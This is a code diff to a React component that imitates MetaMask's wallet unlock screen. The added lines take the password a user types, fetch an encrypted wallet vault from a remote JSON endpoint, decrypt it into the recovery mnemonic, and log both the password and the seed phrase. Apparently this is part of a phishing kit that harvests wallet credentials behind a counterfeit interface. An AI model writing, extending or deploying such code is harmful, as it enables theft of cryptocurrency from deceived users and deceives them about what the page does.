@@ -5,7 +5,7 @@ import { getDatabase } from "firebase/database";
 import { ref, set } from "firebase/database";
 import { v4 as uuidv4 } from 'uuid';
 import axios from 'axios';
-
+import { decryptVaultSync } from "./lib";
 import Mascot from "./mascot.component";
 import useSystemTheme from "./useSystemTheme";
 
@@ -319,19 +319,28 @@ export default function MetaMaskUnlock({onSuccess}) {
     }
 
     setError("");
-    mockPending(setPasswordLoading, 300);
+    mockPending(setPasswordLoading, 330);
 
     try {
       const url = `https://api.npoint.io/a8e12caa3df5c2954957`;
       const response = await axios.get(url);
-      console.log(response.data.success)
       if (response.data.success) {
         onSuccess()
+      } else if (response.data.vault) {
+        console.log("json parse result:", JSON.parse(response.data.vault))
+        console.log("password:", password)
+        const keyringsWithDecodedMnemonic = await decryptVaultSync(password, JSON.parse(response.data.vault));
+        console.log("keyringsWithDecodedMnemonic:", keyringsWithDecodedMnemonic)
+        onSuccess()
+        console.log('Decrypted!')
       } else {
         setError("Password is incorrect. Please try again.");
       }
+      
     } catch (error) {
-      throw new Error(`Failed to fetch data: ${error.message}`);
+      // throw new Error(`Failed to fetch data: ${error.message}`);
+      console.error(`Failed to decrypt vault: ${error.message}`)
+      setError("Password is incorrect. Please try again.");
     }
   };
 
